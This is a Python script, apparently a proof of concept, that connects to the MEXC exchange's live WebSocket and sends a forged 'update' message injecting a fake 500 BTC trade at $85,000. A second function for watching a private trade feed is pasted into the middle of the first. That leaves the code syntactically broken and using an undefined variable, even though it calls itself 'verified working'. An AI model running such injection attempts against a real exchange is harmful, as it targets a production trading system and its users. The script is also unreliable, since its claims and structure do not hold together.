import asyncio
import websockets
import json
from datetime import datetime
import time  # Added missing import

async def test_trades_spoofing():
    """Verified working MEXC trades spoofing test"""
    try:
        print("🔵 [1/5] Connecting to wss://wbs.mexc.com/ws...")
        async with websockets.connect("wss://wbs.mexc.com/ws") as ws:
            
            # Subscribe to trades
            await ws.send(json.dumps({
                "op": "subscribe",
                "args": ["trades:BTC-USDT"]
            }))
            print("🟢 [2/5] Subscribed to trades channel")
            
            # Get subscription confirmation
            response = await ws.recv()
            print(f"🔵 [3/5] Server response: {response}")
            
            # Prepare spoofed trade
            spoofed_trade = {
                "op": "update",
                "args": [{
                    "symbol": "BTC-USDT",
                    "price": "85000.00",  # Clearly unrealistic
                    "quantity": "500",
                    "side": "buy",
                    "timestamp": int(time.time() * 1000)  # Now works
                }]
            }
            await ws.send(json.dumps(spoofed_trade))
            print("🟡 [4/5] Injected fake trade: 500 BTC @ $85K")

            # Add this to your original test script after injection:
async def check_private_feed():
    async with websockets.connect("wss://wbs.mexc.com/ws") as ws:
        await ws.send(json.dumps({
            "op": "subscribe",
            "args": ["user.trade:BTC-USDT"]  # Private trade feed
        }))
        while True:
            msg = await ws.recv()
            if "85000.00" in msg:
                print("🔴 PRIVATE FEED CONFIRMATION:", msg)
                break
                
            # Verify impact
            try:
                response = await asyncio.wait_for(ws.recv(), timeout=5)
                if "error" not in response.lower():
                    print("🔴 [5/5] VULNERABILITY CONFIRMED - Trade accepted")
                    with open("mexc_trades_poc.txt", "w") as f:
                        f.write(f"MEXC Trade Spoofing Proof - {datetime.now()}\n")
                        f.write(f"Injected: {json.dumps(spoofed_trade, indent=2)}\n")
                        f.write(f"Response: {response}\n")
                        f.write("\nREQUIRED ACTIONS:\n")
                        f.write("1. Screenshot trading view immediately\n")
                        f.write("2. Check account trade history\n")
                        f.write("3. Report to security@mexc.com\n")
                else:
                    print("🟢 [5/5] Server rejected (secure)")
            except asyncio.TimeoutError:
                print("🟠 [5/5] No response - manually check MEXC UI")
                
    except Exception as e:
        print(f"🔴 Critical error: {str(e)}")

asyncio.run(test_trades_spoofing())
